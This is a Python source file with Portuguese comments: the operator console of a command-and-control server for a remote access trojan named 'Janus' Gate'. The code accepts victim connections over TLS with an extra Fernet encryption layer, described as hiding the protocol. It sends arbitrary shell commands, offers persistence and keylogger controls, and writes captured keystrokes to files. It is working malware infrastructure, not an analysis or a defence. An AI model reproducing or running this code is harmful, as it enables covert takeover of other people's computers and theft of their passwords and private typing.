import os
import sys
import ssl
import socket
from datetime import datetime

from cryptography.fernet import Fernet


# -----------------------------------------------------------------------------
# Carregamento do ".env" (configuração em tempo de execução)
# -----------------------------------------------------------------------------
# Procura um arquivo .env na mesma pasta e injeta as linhas "CHAVE=valor"
# no os.environ, para que o operador configure a chave C2 sem recompilar.
# Linhas vazias e que começam com "#" são ignoradas.
env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
if os.path.exists(env_path):
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    os.environ[key.strip()] = value.strip()


# -----------------------------------------------------------------------------
# UI — elementos visuais do terminal do operador
# -----------------------------------------------------------------------------
class UI:
    # -----------------------------------------------------------------------------
    # print_banner() — banner ASCII de abertura
    # -----------------------------------------------------------------------------
    # Apenas cosmético: desenha a arte do "Janus' Gate Command & Control Center"
    # na tela do operador. Sem efeito na lógica.
    @staticmethod
    def print_banner():
        print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐             JANUS' GATE COMMAND & CONTROL CENTER              ▌
    ▐                       By Bl4ck0ni                             ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

    # -----------------------------------------------------------------------------
    # print_help() — mostra o menu de comandos disponíveis
    # -----------------------------------------------------------------------------
    # Imprime o mapa de comandos que o operador pode digitar (persistência,
    # keylogger, shell). É só um print de texto formatado.
    @staticmethod
    def print_help():
        print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐                      AVALIABLE COMMANDS                       ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    ▐                                                               ▌  
    ▐    PERSISTENCE:                                               ▌  
    ▐       /persistence status     - Check persistence status      ▌  
    ▐       /persistence setup      - Setup persistence             ▌  
    ▐                                                               ▌  
    ▐   KEYLOGGER:                                                  ▌  
    ▐       /keylog status          - Check keylogger status        ▌  
    ▐       /keylog start           - Start keylogger               ▌  
    ▐       /keylog stop            - Stop keylogger                ▌  
    ▐       /keylog dump            - Dump captured keys            ▌  
    ▐                                                               ▌  
    ▐   SYSTEM:                                                     ▌  
    ▐       cd <path>               - Change directory              ▌  
    ▐       /exit                   - Disconnect client             ▌  
    ▐       /help                   - Show this help menu           ▌    
    ▐       /clear                  - Clear screen                  ▌  
    ▐                                                               ▌  
    ▐   SHELL COMMANDS:                                             ▌  
    ▐       Any other command will be executed as shell command     ▌      
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

    # -----------------------------------------------------------------------------
    # clear_system() — limpa o terminal do operador
    # -----------------------------------------------------------------------------
    # Simplesmente executa "cls" no Windows ou "clear" em Unix/Linux, dependendo
    # do os.name, para "limpar" a tela quando requisitado.
    @staticmethod
    def clear_system():
        os.system('cls' if os.name == 'nt' else 'clear')


# -----------------------------------------------------------------------------
# KeylogStorage — gravação dos dumps de keylog em disco
# -----------------------------------------------------------------------------
class KeylogStorage:
    KEYLOGGER_PATH = "keylog_dumps"  # Diretório de saída dos dumps de keylog

    # -----------------------------------------------------------------------------
    # save_keylog(data, filename=None) — grava um dump de keylog em disco
    # -----------------------------------------------------------------------------
    # Cria o diretório de saída se não existir, gera um nome com timestamp
    # (keylog_<data>_<hora>.txt) caso não receba um filename, e escreve o texto.
    # Retorna True se salvou, False se deu erro.
    @staticmethod
    def save_keylog(data, filename=None):
        try:
            if not os.path.exists(KeylogStorage.KEYLOGGER_PATH):
                os.makedirs(KeylogStorage.KEYLOGGER_PATH)
            
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"keylog_{timestamp}.txt"

            file_path = os.path.join(KeylogStorage.KEYLOGGER_PATH, filename)

            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(data)
            
            print(f"\n[+] keylog saved as: {filename}")
            return True

        except Exception as e:
            print(f"\n[-] Error saving keylog: {e}")
            return False


# -----------------------------------------------------------------------------
# SecureC2Channel — ofuscação do protocolo C2 (TLS + Fernet)
# -----------------------------------------------------------------------------
# Envolve um socket (já com TLS) num canal que cifra cada mensagem com Fernet
# e enquadra em pacotes com cabeçalho de tamanho (4 bytes). Simétrico com a
# versão usada no janus.py: a MESMA chave Fernet nos dois lados.
class SecureC2Channel:
    def __init__(self, sock: socket.socket, encryption_key: bytes):
        self.sock = sock
        self.cipher = Fernet(encryption_key)

    def send(self, data: bytes):
        """Cifra os dados com Fernet e envia pelo socket TLS."""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # 1. Cifrar o payload
        encrypted_data = self.cipher.encrypt(data)
        
        # 2. Enviar o tamanho (4 bytes) seguido do payload cifrado
        length_header = len(encrypted_data).to_bytes(4, byteorder='big')
        self.sock.sendall(length_header + encrypted_data)

    def recv(self, bufsize=1024) -> bytes:
        """Lê o tamanho do pacote, recebe os dados cifrados e os decifra."""
        try:
            # 1. Ler o cabeçalho de tamanho (4 bytes)
            raw_length = self.sock.recv(4)
            if not raw_length:
                return b""
            length = int.from_bytes(raw_length, byteorder='big')
            
            # 2. Ler o payload completo com base no tamanho esperado
            data = bytearray()
            while len(data) < length:
                packet = self.sock.recv(length - len(data))
                if not packet:
                    break
                data.extend(packet)
                
            # 3. Decifrar com Fernet
            return self.cipher.decrypt(bytes(data))
        except socket.timeout:
            # Timeout deve propagar para o chamador tratar (não vira resposta vazia)
            raise
        except Exception as e:
            print(f"[-] Erro ao receber dados: {e}")
            return b""

    def settimeout(self, timeout):
        self.sock.settimeout(timeout)

    def close(self):
        self.sock.close()


# -----------------------------------------------------------------------------
# Server — socket do C2, escuta e atende clientes
# -----------------------------------------------------------------------------
class Server:
    HOST = "0.0.0.0"   # Escuta em todas as interfaces de rede
    PORT = 443         # Porta onde o servidor escuta
    C2_KEY = os.environ.get("C2_KEY", "")  # Chave Fernet (base64) do canal C2
    CERTFILE = "server.crt"  # Certificado auto-assinado do TLS
    KEYFILE = "server.key"   # Chave privada do certificado

    def __init__(self):
        self.ui = UI()
        self.storage = KeylogStorage()

    # -----------------------------------------------------------------------------
    # _wrap_channel(conn) — envolve um socket aceito em TLS + Fernet
    # -----------------------------------------------------------------------------
    # Sobe o TLS do lado do servidor (exige certificado, mesmo auto-assinado) e
    # empacota num SecureC2Channel para cifrar o protocolo.
    def _wrap_channel(self, conn):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.CERTFILE, keyfile=self.KEYFILE)
        secure_conn = context.wrap_socket(conn, server_side=True)
        return SecureC2Channel(secure_conn, self.C2_KEY.encode('utf-8'))

    # -----------------------------------------------------------------------------
    # handle_client(channel, addr) — atende um cliente conectado do início ao fim
    # -----------------------------------------------------------------------------
    # Fluxo de uma sessão:
    #   1. Recebe/printa o "hello" cifrado que o cliente envia ao conectar.
    #   2. Loop de interação: lê o comando digitado, envia ao cliente e lê a
    #      resposta (uma mensagem cifrada, com timeout de 2s).
    #   3. Trata respostas especiais:
    #        - [AUTO-SEND]  -> salva o keylog automaticamente em arquivo
    #        - "/keylog dump" -> pergunta se quer salvar o dump em arquivo
    #   4. "/exit" encerra a sessão. Ctrl+C também envia "/exit" ao cliente.
    def handle_client(self, channel, addr):
        print(f"\n[#] Client connected from {addr[0]}:{addr[1]}")
        print(f"\n[i] Connection estabilished at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("[i] type '/help' for available commands\n")

        try:
            # Lê a primeira mensagem ("hello") do cliente e a exibe
            initial_msg = channel.recv().decode('utf-8', errors='ignore')
            if initial_msg:
                print(initial_msg)

            # Loop de comandos da sessão
            while True:
                try:
                    # Prompt colorido: IP em verde, ">" em ciano
                    command = input(f"\033[1;32m{addr[0]}\033[1;36m>\033[0;0m ").strip()

                    if not command:
                        continue

                    if command == "/help":
                        self.ui.print_help()
                        continue

                    if command == "/clear":
                        self.ui.clear_system()
                        self.ui.print_banner()
                        print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                        continue

                    # Envia o comando para o cliente (cifrado pelo canal)
                    channel.send(command.encode() + b"\n")

                    if command == "/exit":
                        print("\n[!] Client disconnected")
                        break

                    # Lê a resposta completa do cliente: com o framing do canal,
                    # cada envio do cliente corresponde a exatamente uma mensagem.
                    channel.settimeout(2.0)

                    try:
                        response = channel.recv()
                    except socket.timeout:
                        response = b""

                    if response:
                        decoded = response.decode('utf-8', errors='ignore')

                        # Keylog disparado automaticamente quando o buffer encheu:
                        # salva direto em arquivo sem pedir confirmação.
                        if "[AUTO-SEND]" in decoded:
                            keylog_content = decoded.split("[AUTO-SEND]")[1].strip()
                            self.storage.save_keylog(keylog_content)
                        
                        # Para /keylog dump, pergunta ao operador se quer salvar
                        elif command == "/keylog dump":
                            print(decoded)

                            if "[+] Keylog captured" in decoded:
                                save = input("Save this keylog? (y/n): ").lower()
                                if save == 'y':
                                    self.storage.save_keylog(decoded)
                        else:
                            print(decoded, end="")
                    else:
                        print("[!] No response from client")

                except KeyboardInterrupt:
                    print("\n [!] Interrupted. Sending exit command ...")
                    channel.send(b"/exit\n")
                    break
                
                except Exception as e:
                    print(f"\n [-] Error: {e}")
            

        except Exception as e:
            print(f"[-] Connection error: {e}")

        finally:
            channel.close()
            print("\n[!] Connection closed")

    # -----------------------------------------------------------------------------
    # start_listener() — abre o servidor e aceita conexões
    # -----------------------------------------------------------------------------
    # Cria o socket, faz bind em (HOST, PORT), fica em listen (fila de 5) e entra
    # num loop aceitando cliente por cliente. Depois que um cliente termina,
    # pergunta se o operador quer continuar ouvindo por novas conexões.
    def start_listener(self):
        # print_banner()

        try: 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.HOST, self.PORT))
            s.listen(5)

            print(f"[i] Listening on {self.HOST}:{self.PORT}\n")
            print(f"[i] Waiting for connections ... \n")


            while True:
                try:
                    connection, addr = s.accept()
                    channel = self._wrap_channel(connection)
                    self.handle_client(channel, addr)

                    print("\n" + "="*60)
                    choice = input("Wait for new connection? (y/n): ").lower()

                    if choice != 'y':
                        print("[!] Shutting sown listener ...")
                        break
                    
                    print(f"\n[i] Waiting for connections ... \n")


                except KeyboardInterrupt:
                    print("\n[!] Interrupted by user")
                    break
            
        
        except Exception as e:
            print(f"[-] Listener error: {e}")

        
        finally:
            s.close()
            print("[!] Listener stopped")


# -----------------------------------------------------------------------------
# __main__ — ponto de entrada do servidor
# -----------------------------------------------------------------------------
# Só chama start_listener() e trata o Ctrl+C para sair de forma limpa.
if __name__ == "__main__":
    try:
        server = Server()
        server.start_listener()
    
    except KeyboardInterrupt:
        print("\n[!] Exiting ... ")
        sys.exit(0)
